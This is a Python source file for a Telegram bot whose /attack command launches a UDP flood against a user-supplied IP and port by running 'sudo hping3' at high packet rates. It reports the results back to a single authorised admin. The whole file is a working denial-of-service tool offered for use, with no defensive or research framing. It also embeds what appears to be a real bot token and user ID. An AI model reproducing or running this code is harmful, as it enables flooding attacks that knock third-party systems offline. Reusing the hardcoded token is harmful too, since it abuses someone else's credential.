import subprocess
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8551582601:AAGAykmL5ph6d9MIgYS4ypGX-VStNkMlVoM"
ADMIN_ID =7820814565 # Replace with your Telegram User ID

# Logging setup
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome. Use /attack <IP> <Port> <Count>")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 1. Security Check
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    # 2. Argument Parsing
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❓ Usage: /attack <IP> <Port> <Count>")
        return

    target_ip, port, count = args

    # 3. Data Validation
    if not (port.isdigit() and count.isdigit()):
        await update.message.reply_text("❌ Port and Count must be numbers.")
        return

    await update.message.reply_text(f"🚀 Launching UDP Flood\n🎯 Target: {target_ip}:{port}\n📦 Size: 1024 bytes\n🔢 Packets: {count}")

    # 4. Construct hping3 command
    # --udp: UDP mode, -d: 1024 byte size, -i u10: high speed
    cmd = [
        "sudo", "hping3", 
        "--udp", 
        "-p", port, 
        "-d", "1024", 
        "-c", count, 
        "-i", "u10", 
        target_ip
    ]

    try:
        # Run the process
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        # Send back the last 3 lines (the stats summary)
        summary = "\n".join(result.stdout.splitlines()[-3:])
        await update.message.reply_text(f"✅ Attack Finished.\n\n{summary}")
        
    except subprocess.TimeoutExpired:
        await update.message.reply_text("⚠️ Process timed out.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    
    print("Bot is running...")
    app.run_polling()
